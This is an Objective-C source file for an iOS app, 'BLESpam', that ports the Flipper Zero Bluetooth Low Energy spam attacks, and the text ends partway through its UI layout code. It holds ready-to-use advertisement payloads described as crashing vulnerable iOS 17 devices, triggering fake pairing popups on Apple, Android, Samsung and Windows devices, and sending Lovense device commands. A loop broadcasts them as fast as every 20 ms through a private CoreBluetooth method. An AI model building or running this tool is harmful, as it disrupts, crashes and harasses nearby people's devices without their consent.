/**
 * BLESpam — iOS 18 Style
 * Full redesign with all Flipper Zero BLE Spam modes.
 *
 * Tabs:
 *   0  Payloads  — mode picker + start/stop card
 *   1  Timing    — delay presets + slider
 *   2  Custom    — raw HEX input
 *   3  Logs      — live packet console
 */

#import <UIKit/UIKit.h>
#import <CoreBluetooth/CoreBluetooth.h>
#import <objc/message.h>

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Design tokens
// ─────────────────────────────────────────────────────────────────────────────

#define CLR_BG          [UIColor colorWithRed:0   green:0   blue:0   alpha:1]
#define CLR_CARD        [UIColor colorWithRed:.11 green:.11 blue:.12 alpha:1]
#define CLR_SEP         [UIColor colorWithWhite:1 alpha:.10]
#define CLR_ACCENT      [UIColor colorWithRed:.04 green:.52 blue:1   alpha:1]   // #0A84FF
#define CLR_ORANGE      [UIColor colorWithRed:1   green:.62 blue:.04 alpha:1]   // #FF9F0A
#define CLR_SUCCESS     [UIColor colorWithRed:.20 green:.78 blue:.35 alpha:1]
#define CLR_DANGER      [UIColor colorWithRed:1   green:.27 blue:.23 alpha:1]
#define CLR_FG          [UIColor whiteColor]
#define CLR_FG2         [UIColor colorWithWhite:.6 alpha:1]
#define CLR_FG3         [UIColor colorWithWhite:.35 alpha:1]
#define CORNER_CARD     18.0
#define CORNER_BTN      14.0

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - BLE Payload definitions
// ─────────────────────────────────────────────────────────────────────────────

typedef NS_ENUM(NSInteger, BLEMode) {
    BLEModeKitchenSink = 0,
    BLEModeiOS17Crash,
    BLEModeAppleActionModal,
    BLEModeAppleDevicePopup,
    BLEModeAndroidFastPair,
    BLEModeSamsungEasySetup,
    BLEModeWindowsSwiftPair,
    BLEModeLovespouse,
    BLEModeCustom,
    BLEModeCount
};

static NSString *modeNames[BLEModeCount] = {
    @"Kitchen Sink",
    @"iOS 17 Crash",
    @"Apple Action Modal",
    @"Apple Device Popup",
    @"Android Fast Pair",
    @"Samsung Easy Setup",
    @"Windows Swift Pair",
    @"LoveSpouse",
    @"Custom HEX",
};

static NSString *modeDescriptions[BLEModeCount] = {
    @"All payloads in random order — maximum chaos",
    @"Continuity packets that lock up vulnerable iOS 17 devices",
    @"System action popups: AppleTV, HomePod, iPhone Setup",
    @"Proximity Pairing cards: AirPods, Beats, AirTag",
    @"Google Fast Pair (0xFE2C) — triggers Android pairing notifications",
    @"Samsung Galaxy Buds/Watch Easy Setup packets",
    @"Microsoft Swift Pair (0x0006) — Windows 10/11 pairing popups",
    @"Lovense smart-device broadcast commands",
    @"Custom raw HEX manufacturer data",
};

// ── Helpers ───────────────────────────────────────────────────────────────────

static NSData *bytes(const uint8_t *b, NSUInteger len) {
    return [NSData dataWithBytes:b length:len];
}

// Apple Continuity: company 0x004C
#define APPLE(...)  bytes((uint8_t[]){0x4C,0x00,__VA_ARGS__}, sizeof((uint8_t[]){0x4C,0x00,__VA_ARGS__}))

// Google Fast Pair service data (UUID 0xFE2C)
#define FASTPAIR(a,b,c) bytes((uint8_t[]){a,b,c}, 3)

// Samsung (company 0x0075)
#define SAMSUNG(...)  bytes((uint8_t[]){0x75,0x00,__VA_ARGS__}, sizeof((uint8_t[]){0x75,0x00,__VA_ARGS__}))

// Microsoft Swift Pair (company 0x0006)
#define SWIFT(...)  bytes((uint8_t[]){0x06,0x00,0x03,__VA_ARGS__}, sizeof((uint8_t[]){0x06,0x00,0x03,__VA_ARGS__}))

// Lovense (company 0x0059)
#define LOVENSE(...) bytes((uint8_t[]){0x59,0x00,__VA_ARGS__}, sizeof((uint8_t[]){0x59,0x00,__VA_ARGS__}))

// ── Payload tables ────────────────────────────────────────────────────────────

static NSArray *payloadsForMode(BLEMode mode, NSData *customData) {
    switch (mode) {

    // ── iOS 17 Crash ──────────────────────────────────────────────────────────
    case BLEModeiOS17Crash:
        return @[
            // Modified Nearby Action with crash-triggering flags
            APPLE(0x0F,0x05,0xFF,0xFF,0xFF,0xFF,0xFF),
            APPLE(0x0F,0x05,0xC0,0xFF,0xFF,0xFF,0xFF),
            APPLE(0x0F,0x05,0x80,0xFF,0xFF,0xFF,0xFF),
            APPLE(0x0F,0x05,0x40,0xFF,0xFF,0xFF,0xFF),
        ];

    // ── Apple Action Modal ────────────────────────────────────────────────────
    case BLEModeAppleActionModal:
        return @[
            // AppleTV Setup
            APPLE(0x04,0x05,0x03,0xC0,0x57,0xAA,0x01),
            // AppleTV Pair
            APPLE(0x04,0x05,0x03,0xC0,0x57,0xAA,0x02),
            // AppleTV New User
            APPLE(0x04,0x05,0x03,0xC0,0x57,0xAA,0x03),
            // Setup New iPhone
            APPLE(0x04,0x05,0x01,0xC0,0x57,0xAA,0x00),
            // Transfer Phone Number
            APPLE(0x04,0x05,0x02,0xC0,0x57,0xAA,0x00),
            // HomePod Setup
            APPLE(0x04,0x05,0x0D,0xC0,0x57,0xAA,0x00),
            // Apple Watch
            APPLE(0x04,0x05,0x0B,0xC0,0x57,0xAA,0x00),
        ];

    // ── Apple Device Popup (Proximity Pairing) ────────────────────────────────
    case BLEModeAppleDevicePopup:
        return @[
            // AirPods Pro (2nd gen)
            APPLE(0x07,0x19,0x07,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // AirPods (3rd gen)
            APPLE(0x07,0x19,0x13,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // AirPods Max
            APPLE(0x07,0x19,0x0A,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // AirPods (2nd gen)
            APPLE(0x07,0x19,0x0F,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // Beats Solo Pro
            APPLE(0x07,0x19,0x0C,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // Powerbeats Pro
            APPLE(0x07,0x19,0x0B,0x00,0x20,0x75,0xAA,0x30,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0F),
            // AirTag
            APPLE(0x12,0x19,0x10,0x00,0x48,0xB3,0x5A,0x44,0x77,0x03,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00),
        ];

    // ── Android Fast Pair ─────────────────────────────────────────────────────
    case BLEModeAndroidFastPair:
        // Service UUID 0xFE2C, 3-byte model IDs
        return @[
            FASTPAIR(0x2B,0x41,0x02),   // Galaxy Buds Pro
            FASTPAIR(0x2B,0x41,0x0A),   // Galaxy Buds 2
            FASTPAIR(0x2B,0x41,0x0C),   // Galaxy Buds Live
            FASTPAIR(0x2B,0x41,0x06),   // Pixel Buds A
            FASTPAIR(0xF5,0x36,0x01),   // Pixel Buds Pro
            FASTPAIR(0x82,0xD3,0x00),   // JBL Flip 6
            FASTPAIR(0xCC,0xCA,0x00),   // Sony WH-1000XM4
            FASTPAIR(0x71,0x8B,0x00),   // Bose QuietComfort 45
        ];

    // ── Samsung Easy Setup ────────────────────────────────────────────────────
    case BLEModeSamsungEasySetup:
        return @[
            // Galaxy Buds Live  (0x0060)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0x60,0x00,0x00,0x00,0x00,0x00),
            // Galaxy Buds Pro   (0x0061)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0x61,0x00,0x00,0x00,0x00,0x00),
            // Galaxy Buds 2     (0x00EE)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0xEE,0x00,0x00,0x00,0x00,0x00),
            // Galaxy Watch 4    (0x0246)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0x46,0x02,0x00,0x00,0x00,0x00),
            // Galaxy Watch 5    (0x02C4)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0xC4,0x02,0x00,0x00,0x00,0x00),
            // Galaxy Watch 6    (0x0326)
            SAMSUNG(0x01,0x00,0x02,0x00,0x00,0x00,0x26,0x03,0x00,0x00,0x00,0x00),
        ];

    // ── Windows Swift Pair ────────────────────────────────────────────────────
    case BLEModeWindowsSwiftPair:
        return @[
            // Headphones
            SWIFT(0x00,0x80),
            // Keyboard
            SWIFT(0x00,0x40),
            // Mouse
            SWIFT(0x00,0x20),
            // Gamepad
            SWIFT(0x00,0x10),
            // Printer
            SWIFT(0x00,0x08),
        ];

    // ── Lovespouse / Lovense ──────────────────────────────────────────────────
    case BLEModeLovespouse:
        return @[
            LOVENSE(0x01,0x00,0x0A,0x00,0x00),
            LOVENSE(0x01,0x00,0x14,0x00,0x00),
            LOVENSE(0x01,0x00,0x1E,0x00,0x00),
            LOVENSE(0x02,0x00,0x0A,0x00,0x00),
            LOVENSE(0x03,0x00,0x0A,0x00,0x00),
        ];

    // ── Custom ────────────────────────────────────────────────────────────────
    case BLEModeCustom:
        return customData ? @[customData] : @[];

    // ── Kitchen Sink (все пакеты вместе) ──────────────────────────────────────
    case BLEModeKitchenSink:
    default: {
        NSMutableArray *all = [NSMutableArray array];
        for (BLEMode m = BLEModeiOS17Crash; m <= BLEModeLovespouse; m++) {
            [all addObjectsFromArray:payloadsForMode(m, nil)];
        }
        // Shuffle
        for (NSUInteger i = all.count - 1; i > 0; i--) {
            NSUInteger j = arc4random_uniform((uint32_t)(i + 1));
            [all exchangeObjectAtIndex:i withObjectAtIndex:j];
        }
        return all;
    }
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - BLESpamEngine
// ─────────────────────────────────────────────────────────────────────────────

@interface BLESpamEngine : NSObject <CBPeripheralManagerDelegate>

@property (nonatomic, strong) CBPeripheralManager *pm;
@property (nonatomic, assign) BOOL isSpamming;
@property (nonatomic, assign) BLEMode mode;
@property (nonatomic, assign) NSTimeInterval interval;   // seconds
@property (nonatomic, strong) NSData *customPayload;

// Stats
@property (nonatomic, assign) NSUInteger totalSent;
@property (nonatomic, assign) NSUInteger pps;            // packets/sec last window

// Callbacks
@property (nonatomic, copy) void (^onStateChange)(BOOL isOn);
@property (nonatomic, copy) void (^onPacketSent)(NSData *payload, NSUInteger total);
@property (nonatomic, copy) void (^onError)(NSString *msg);

+ (instancetype)shared;
- (void)start;
- (void)stop;

@end

static BLESpamEngine *gEngine;

@implementation BLESpamEngine {
    NSTimer  *_timer;
    NSArray  *_payloads;
    NSUInteger _idx;
    NSUInteger _windowCount;
    NSTimer  *_ppsTimer;
}

+ (instancetype)shared {
    static dispatch_once_t t;
    dispatch_once(&t, ^{ gEngine = [self new]; });
    return gEngine;
}

- (instancetype)init {
    self = [super init];
    _mode = BLEModeAppleDevicePopup;
    _interval = 0.1;
    return self;
}

// ── Private BLE advertise ─────────────────────────────────────────────────────

- (void)advertise:(NSData *)d {
    NSDictionary *ad = @{CBAdvertisementDataManufacturerDataKey: d};
    SEL sel = NSSelectorFromString(
        @"_startAdvertisingWithAdvertisementData:andMask:andFlags:andCompletionHandler:"
    );
    if ([_pm respondsToSelector:sel]) {
        NSMethodSignature *sig = [_pm methodSignatureForSelector:sel];
        NSInvocation *inv = [NSInvocation invocationWithMethodSignature:sig];
        inv.target = _pm; inv.selector = sel;
        [inv setArgument:&ad atIndex:2];
        uint8_t mask = 0x00, flags = 0x06;
        [inv setArgument:&mask  atIndex:3];
        [inv setArgument:&flags atIndex:4];
        id h = nil; [inv setArgument:&h atIndex:5];
        [inv invoke];
    } else {
        [_pm startAdvertising:ad];
    }
}

// ── Public API ────────────────────────────────────────────────────────────────

- (void)start {
    if (_isSpamming) return;
    _totalSent = 0; _idx = 0; _windowCount = 0; _pps = 0;
    _pm = [[CBPeripheralManager alloc] initWithDelegate:self
                                                  queue:dispatch_get_main_queue()
                                                options:@{CBPeripheralManagerOptionShowPowerAlertKey:@YES}];
}

- (void)stop {
    [_timer invalidate]; _timer = nil;
    [_ppsTimer invalidate]; _ppsTimer = nil;
    [_pm stopAdvertising]; _pm = nil;
    _isSpamming = NO;
    if (_onStateChange) _onStateChange(NO);
}

- (void)startLoop {
    _isSpamming = YES;
    if (_onStateChange) _onStateChange(YES);
    _payloads = payloadsForMode(_mode, _customPayload);
    if (!_payloads.count) { [self stop]; return; }

    [self sendNext];
    [_timer invalidate];
    _timer = [NSTimer scheduledTimerWithTimeInterval:_interval
                                             repeats:YES
                                               block:^(NSTimer *t){ [self sendNext]; }];

    // PPS counter: reset window every 1s
    _ppsTimer = [NSTimer scheduledTimerWithTimeInterval:1.0
                                                repeats:YES
                                                  block:^(NSTimer *t){
        self->_pps = self->_windowCount;
        self->_windowCount = 0;
    }];
}

- (void)sendNext {
    if (!_payloads.count) return;
    if (_idx >= _payloads.count) {
        _idx = 0;
        // Reshuffle Kitchen Sink
        if (_mode == BLEModeKitchenSink) {
            _payloads = payloadsForMode(BLEModeKitchenSink, nil);
        }
    }
    NSData *d = _payloads[_idx++];
    [_pm stopAdvertising];
    [self advertise:d];
    _totalSent++;
    _windowCount++;
    if (_onPacketSent) _onPacketSent(d, _totalSent);
}

// ── Dynamic interval update (no restart needed) ───────────────────────────────

- (void)setInterval:(NSTimeInterval)interval {
    _interval = interval;
    if (_isSpamming) {
        [_timer invalidate];
        _timer = [NSTimer scheduledTimerWithTimeInterval:_interval
                                                 repeats:YES
                                                   block:^(NSTimer *t){ [self sendNext]; }];
    }
}

// ── CBPeripheralManagerDelegate ───────────────────────────────────────────────

- (void)peripheralManagerDidUpdateState:(CBPeripheralManager *)p {
    dispatch_async(dispatch_get_main_queue(), ^{
        switch (p.state) {
            case CBManagerStatePoweredOn:  [self startLoop]; break;
            case CBManagerStatePoweredOff: [self stop]; if (self->_onError) self->_onError(@"Bluetooth is off."); break;
            case CBManagerStateUnauthorized: [self stop]; if (self->_onError) self->_onError(@"Bluetooth permission denied."); break;
            default: break;
        }
    });
}

- (void)peripheralManagerDidStartAdvertising:(CBPeripheralManager *)p error:(NSError *)e {}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - UI helpers
// ─────────────────────────────────────────────────────────────────────────────

static UILabel *label(NSString *text, UIFont *font, UIColor *color) {
    UILabel *l = [UILabel new];
    l.text = text; l.font = font; l.textColor = color;
    l.translatesAutoresizingMaskIntoConstraints = NO;
    return l;
}

static UIView *separator(void) {
    UIView *v = [[UIView alloc] initWithFrame:CGRectZero];
    v.backgroundColor = CLR_SEP;
    v.translatesAutoresizingMaskIntoConstraints = NO;
    return v;
}

static UIView *card(void) {
    UIView *v = [[UIView alloc] initWithFrame:CGRectZero];
    v.backgroundColor = CLR_CARD;
    v.layer.cornerRadius = CORNER_CARD;
    v.translatesAutoresizingMaskIntoConstraints = NO;
    return v;
}

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Status Card (reused across tabs)
// ─────────────────────────────────────────────────────────────────────────────

@interface StatusCardView : UIView
@property UILabel *modeLbl, *statusLbl, *delayLbl, *ppsLbl;
@property UIView *statusDot;
- (void)updateWithMode:(BLEMode)m active:(BOOL)active delay:(NSTimeInterval)d pps:(NSUInteger)pps packets:(NSUInteger)pkts;
@end

@implementation StatusCardView

- (instancetype)init {
    self = [super init];
    self.backgroundColor = CLR_CARD;
    self.layer.cornerRadius = CORNER_CARD;
    self.translatesAutoresizingMaskIntoConstraints = NO;

    // dot
    _statusDot = [[UIView alloc] initWithFrame:CGRectMake(0,0,10,10)];
    _statusDot.layer.cornerRadius = 5;
    _statusDot.backgroundColor = CLR_FG3;
    _statusDot.translatesAutoresizingMaskIntoConstraints = NO;
    [self addSubview:_statusDot];

    _statusLbl = label(@"Idle", [UIFont systemFontOfSize:13 weight:UIFontWeightSemibold], CLR_FG2);
    _modeLbl   = label(@"—", [UIFont systemFontOfSize:17 weight:UIFontWeightBold], CLR_FG);
    _delayLbl  = label(@"—", [UIFont monospacedDigitSystemFontOfSize:13 weight:UIFontWeightMedium], CLR_FG2);
    _ppsLbl    = label(@"0 pps", [UIFont monospacedDigitSystemFontOfSize:22 weight:UIFontWeightBold], CLR_ACCENT);
    [self addSubview:_statusLbl]; [self addSubview:_modeLbl];
    [self addSubview:_delayLbl];  [self addSubview:_ppsLbl];

    UILabel *ppsCaption = label(@"packets / sec", [UIFont systemFontOfSize:11], CLR_FG3);
    [self addSubview:ppsCaption];

    UIView *sep = separator();
    [self addSubview:sep];

    [NSLayoutConstraint activateConstraints:@[
        [_statusDot.leadingAnchor  constraintEqualToAnchor:self.leadingAnchor  constant:16],
        [_statusDot.centerYAnchor  constraintEqualToAnchor:_statusLbl.centerYAnchor],
        [_statusDot.widthAnchor    constraintEqualToConstant:10],
        [_statusDot.heightAnchor   constraintEqualToConstant:10],

        [_statusLbl.leadingAnchor  constraintEqualToAnchor:_statusDot.trailingAnchor constant:6],
        [_statusLbl.topAnchor      constraintEqualToAnchor:self.topAnchor constant:16],

        [_modeLbl.leadingAnchor    constraintEqualToAnchor:self.leadingAnchor constant:16],
        [_modeLbl.topAnchor        constraintEqualToAnchor:_statusLbl.bottomAnchor constant:4],
        [_modeLbl.trailingAnchor   constraintEqualToAnchor:self.trailingAnchor constant:-16],

        [_delayLbl.leadingAnchor   constraintEqualToAnchor:self.leadingAnchor constant:16],
        [_delayLbl.topAnchor       constraintEqualToAnchor:_modeLbl.bottomAnchor constant:4],

        [sep.leadingAnchor         constraintEqualToAnchor:self.leadingAnchor constant:16],
        [sep.trailingAnchor        constraintEqualToAnchor:self.trailingAnchor constant:-16],
        [sep.topAnchor             constraintEqualToAnchor:_delayLbl.bottomAnchor constant:12],
        [sep.heightAnchor          constraintEqualToConstant:.5],

        [_ppsLbl.leadingAnchor     constraintEqualToAnchor:self.leadingAnchor constant:16],
        [_ppsLbl.topAnchor         constraintEqualToAnchor:sep.bottomAnchor constant:12],
        [_ppsLbl.bottomAnchor      constraintEqualToAnchor:self.bottomAnchor constant:-16],

        [ppsCaption.leadingAnchor  constraintEqualToAnchor:_ppsLbl.trailingAnchor constant:8],
        [ppsCaption.centerYAnchor  constraintEqualToAnchor:_ppsLbl.centerYAnchor],
    ]];
    return self;
}

- (void)updateWithMode:(BLEMode)m active:(BOOL)active delay:(NSTimeInterval)d pps:(NSUInteger)pps packets:(NSUInteger)pkts {
    _modeLbl.text   = modeNames[m];
    _delayLbl.text  = [NSString stringWithFormat:@"%lu ms interval · %lu total", (unsigned long)(d*1000), (unsigned long)pkts];
    _ppsLbl.text    = [NSString stringWithFormat:@"%lu", (unsigned long)pps];
    if (active) {
        _statusLbl.text             = @"Broadcasting";
        _statusLbl.textColor        = CLR_ORANGE;
        _statusDot.backgroundColor  = CLR_ORANGE;
        _ppsLbl.textColor           = CLR_ORANGE;
    } else {
        _statusLbl.text             = @"Idle";
        _statusLbl.textColor        = CLR_FG2;
        _statusDot.backgroundColor  = CLR_FG3;
        _ppsLbl.textColor           = CLR_ACCENT;
    }
}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Payloads Tab
// ─────────────────────────────────────────────────────────────────────────────

@interface PayloadsVC : UIViewController <UITableViewDelegate, UITableViewDataSource>
@property StatusCardView *statusCard;
@property UIButton       *startStopBtn;
@property UITableView    *tableView;
@property NSTimer        *uiTimer;
@property CAShapeLayer   *pulseLayer;
@end

@implementation PayloadsVC

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = CLR_BG;

    // Large title
    self.navigationItem.title = @"Payloads";
    self.navigationController.navigationBar.prefersLargeTitles = YES;
    self.navigationItem.largeTitleDisplayMode = UINavigationItemLargeTitleDisplayModeAlways;

    // Status card
    _statusCard = [StatusCardView new];
    [self.view addSubview:_statusCard];

    // Start/Stop button
    _startStopBtn = [UIButton buttonWithType:UIButtonTypeSystem];
    _startStopBtn.translatesAutoresizingMaskIntoConstraints = NO;
    [_startStopBtn setTitle:@"START" forState:UIControlStateNormal];
    _startStopBtn.titleLabel.font = [UIFont systemFontOfSize:17 weight:UIFontWeightBold];
    _startStopBtn.tintColor = CLR_FG;
    _startStopBtn.backgroundColor = CLR_ACCENT;
    _startStopBtn.layer.cornerRadius = CORNER_BTN + 6;
    [_startStopBtn addTarget:self action:@selector(toggleSpam) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:_startStopBtn];

    // Mode table
    _tableView = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStyleInsetGrouped];
    _tableView.translatesAutoresizingMaskIntoConstraints = NO;
    _tableView.backgroundColor = CLR_BG;
    _tableView.delegate = self;
    _tableView.dataSource = self;
    _tableView.scrollEnabled = YES;
    [_tableView registerClass:[UITableViewCell class] forCellReuseIdentifier:@"cell"];
    [self.view addSubview:_tableView];

    // Layout
    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [_statusCard.topAnchor      constraintEqualToAnchor:safe.topAnchor constant:12],
        [_statusCard.leadingAnchor  constraintEqualToAnchor:self.view.leadingAnchor constant:16],
        [_statusCard.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-16],

        [_startStopBtn.topAnchor      constraintEqualToAnchor:_statusCard.bottomAnchor constant:12],
        [_startStopBtn.leadingAnchor  constraintEqualToAnchor:self.view.leadingAnchor constant:16],
        [_startStopBtn.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor constant:-16],
        [_startStopBtn.heightAnchor   constraintEqualToConstant:54],

        [_tableView.topAnchor      constraintEqualToAnchor:_startStopBtn.bottomAnchor constant:8],
        [_tableView.leadingAnchor  constraintEqualToAnchor:self.view.leadingAnchor],
        [_tableView.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [_tableView.bottomAnchor   constraintEqualToAnchor:self.view.bottomAnchor],
    ]];

    [self updateUI];
}

- (void)viewWillAppear:(BOOL)animated {
    [super viewWillAppear:animated];
    _uiTimer = [NSTimer scheduledTimerWithTimeInterval:0.5 repeats:YES block:^(NSTimer *t){ [self updateUI]; }];
}

- (void)viewWillDisappear:(BOOL)animated {
    [super viewWillDisappear:animated];
    [_uiTimer invalidate]; _uiTimer = nil;
}

- (void)updateUI {
    BLESpamEngine *e = BLESpamEngine.shared;
    [_statusCard updateWithMode:e.mode active:e.isSpamming delay:e.interval pps:e.pps packets:e.totalSent];

    if (e.isSpamming) {
        [_startStopBtn setTitle:@"STOP" forState:UIControlStateNormal];
        _startStopBtn.backgroundColor = CLR_DANGER;
        [self animatePulse:YES];
    } else {
        [_startStopBtn setTitle:@"START" forState:UIControlStateNormal];
        _startStopBtn.backgroundColor = CLR_ACCENT;
        [self animatePulse:NO];
    }
}

- (void)animatePulse:(BOOL)on {
    if (on) {
        if (_pulseLayer) return;
        _pulseLayer = [CAShapeLayer layer];
        _pulseLayer.path = [UIBezierPath bezierPathWithRoundedRect:_startStopBtn.bounds
                                                      cornerRadius:CORNER_BTN + 6].CGPath;
        _pulseLayer.fillColor = [CLR_DANGER colorWithAlphaComponent:0.4].CGColor;
        [_startStopBtn.layer insertSublayer:_pulseLayer atIndex:0];

        CABasicAnimation *a = [CABasicAnimation animationWithKeyPath:@"transform.scale"];
        a.fromValue = @1.0; a.toValue = @1.08;
        a.duration = 0.7; a.autoreverses = YES;
        a.repeatCount = HUGE_VALF;
        [_pulseLayer addAnimation:a forKey:@"pulse"];
    } else {
        [_pulseLayer removeFromSuperlayer];
        _pulseLayer = nil;
    }
}

- (void)toggleSpam {
    BLESpamEngine *e = BLESpamEngine.shared;
    UIImpactFeedbackGenerator *hap = [[UIImpactFeedbackGenerator alloc] initWithStyle:UIImpactFeedbackStyleMedium];
    [hap impactOccurred];
    if (e.isSpamming) { [e stop]; } else { [e start]; }
    [self updateUI];
}

// ── UITableView ───────────────────────────────────────────────────────────────

- (NSInteger)tableView:(UITableView *)tv numberOfRowsInSection:(NSInteger)s { return BLEModeCount; }
- (NSString *)tableView:(UITableView *)tv titleForHeaderInSection:(NSInteger)s { return @"Select Mode"; }

- (UITableViewCell *)tableView:(UITableView *)tv cellForRowAtIndexPath:(NSIndexPath *)ip {
    UITableViewCell *cell = [tv dequeueReusableCellWithIdentifier:@"cell" forIndexPath:ip];
    cell.backgroundColor = CLR_CARD;

    UIListContentConfiguration *cfg = [cell defaultContentConfiguration];
    cfg.text = modeNames[ip.row];
    cfg.secondaryText = modeDescriptions[ip.row];
    cfg.textProperties.color = CLR_FG;
    cfg.secondaryTextProperties.color = CLR_FG2;
    cfg.textProperties.font = [UIFont systemFontOfSize:16 weight:UIFontWeightMedium];
    cfg.secondaryTextProperties.font = [UIFont systemFontOfSize:12];
    cell.contentConfiguration = cfg;

    cell.accessoryType = (ip.row == (NSInteger)BLESpamEngine.shared.mode)
        ? UITableViewCellAccessoryCheckmark : UITableViewCellAccessoryNone;
    cell.tintColor = CLR_ACCENT;
    return cell;
}

- (void)tableView:(UITableView *)tv didSelectRowAtIndexPath:(NSIndexPath *)ip {
    [tv deselectRowAtIndexPath:ip animated:YES];
    BLESpamEngine.shared.mode = (BLEMode)ip.row;
    [tv reloadData];
    UISelectionFeedbackGenerator *f = [UISelectionFeedbackGenerator new];
    [f selectionChanged];
}

@end

// ─────────────────────────────────────────────────────────────────────────────
// MARK: - Timing Tab
// ─────────────────────────────────────────────────────────────────────────────

@interface TimingVC : UIViewController
@property UILabel *valueLabel;
@property UISlider *slider;
@property UISegmentedControl *presets;
@end

@implementation TimingVC

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.backgroundColor = CLR_BG;
    self.navigationItem.title = @"Timing";
    self.navigationController.navigationBar.prefersLargeTitles = YES;
    self.navigationItem.largeTitleDisplayMode = UINavigationItemLargeTitleDisplayModeAlways;

    UIScrollView *scroll = [[UIScrollView alloc] initWithFrame:CGRectZero];
    scroll.translatesAutoresizingMaskIntoConstraints = NO;
    [self.view addSubview:scroll];
    UILayoutGuide *safe = self.view.safeAreaLayoutGuide;
    [NSLayoutConstraint activateConstraints:@[
        [scroll.topAnchor    constraintEqualToAnchor:safe.topAnchor],
        [scroll.leadingAnchor constraintEqualToAnchor:self.view.leadingAnchor],
        [scroll.trailingAnchor constraintEqualToAnchor:self.view.trailingAnchor],
        [scroll.bottomAnchor  constraintEqualToAnchor:self.view.bottomAnchor],
    ]];

    UIView *content = [[UIView alloc] initWithFrame:CGRectZero];
    content.translatesAutoresizingMaskIntoConstraints = NO;
    [scroll addSubview:content];
    [NSLayoutConstraint activateConstraints:@[
        [content.topAnchor     constraintEqualToAnchor:scroll.topAnchor],
        [content.leadingAnchor constraintEqualToAnchor:scroll.leadingAnchor],
        [content.trailingAnchor constraintEqualToAnchor:scroll.trailingAnchor],
        [content.bottomAnchor  constraintEqualToAnchor:scroll.bottomAnchor],
        [content.widthAnchor   constraintEqualToAnchor:scroll.widthAnchor],
    ]];

    // ── Presets card ──────────────────────────────────────────────────────────
    UIView *presetsCard = card();
    [content addSubview:presetsCard];

    UILabel *presetsTitle = label(@"SPEED PRESET", [UIFont systemFontOfSize:12 weight:UIFontWeightSemibold], CLR_FG3);
    [presetsCard addSubview:presetsTitle];

    _presets = [[UISegmentedControl alloc] initWithItems:@[@"20ms", @"50ms", @"100ms", @"200ms", @"500ms"]];
    _presets.translatesAutoresizingMaskIntoConstraints = NO;
    _presets.selectedSegmentIndex = 2;
    _presets.selectedSegmentTintColor = CLR_ACCENT;
    [_presets setTitleTextAttributes:@{NSForegroundColorAttributeName: CLR_FG} forState:UIControlStateNormal];
    [_presets setTitleTextAttributes:@{NSForegroundColorAttributeName: CLR_FG} forState:UIControlStateSelected];
    _presets.backgroundColor = [UIColor colorWithWhite:.15 alpha:1];
    [_presets addTarget:self action:@selector(presetChanged) forControlEvents:UIControlEventValueChanged];
    [presetsCard addSubview:_presets];

    NSArray *presetLabels = @[@"Insane", @"Fast", @"Normal", @"Slow", @"Stealth"];
    UIStackView *labelStack = [[UIStackView alloc] initWithFrame:CGRectZero];
    labelStack.translatesAutoresizingMaskIntoConstraints = NO;
    labelStack.axis = UILayoutConstraintAxisHorizontal;
    labelStack.distribution = UIStackViewDistributionFillEqually;
    for (NSString *s in presetLabels) {
        UILabel *l = label(s, [UIFont systemFontOfSize:10], CLR_FG3);
        l.textAlignment = NSTextAlignmentCenter;
        [labelStack addArrangedSubview:l];
    }
    [presetsCard addSubview:labelStack];

    [NSLayoutConstraint activateConstraints:@[
        [presetsCard.topAnchor      constraintEqualToAnchor:content.topAnchor constant:16],
        [presetsCard.leadingAnchor  constraintEqualToAnchor:content.leadingAnchor constant:16],
        [presetsCard.trailingAnchor constraintEqualToAnchor:content.trailingAnchor constant:-16],

        [presetsTitle.topAnchor     constraintEqualToAnchor:presetsCard.topAnchor constant:14],
        [presetsTitle.leadingAnchor constraintEqualToAnchor:presetsCard.leadingAnchor constant:16],

        [_presets.topAnchor     constraintEqualToAnchor:presetsTitle.bottomAnchor constant:10],
        [_presets.leadingAnchor constraintEqualToAnchor:presetsCard.leadingAnchor constant:16],
        [_presets.trailingAnchor constraintEqualToAnchor:presetsCard.trailingAnchor constant:-16],

        [labelStack.topAnchor     constraintEqualToAnchor:_presets.bottomAnchor constant:4],
        [labelStack.leadingAnchor constraintEqualToAnchor:presetsCard.leadingAnchor constant:16],
